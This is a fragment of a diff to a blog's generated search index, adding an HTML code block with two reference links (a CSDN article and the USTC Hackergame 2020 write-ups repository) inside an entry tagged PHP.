+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;KSroido&#x2F;article&#x2F;details&#x2F;109656236</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;USTC-Hackergame&#x2F;hackergame2020-writeups</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
 </search>
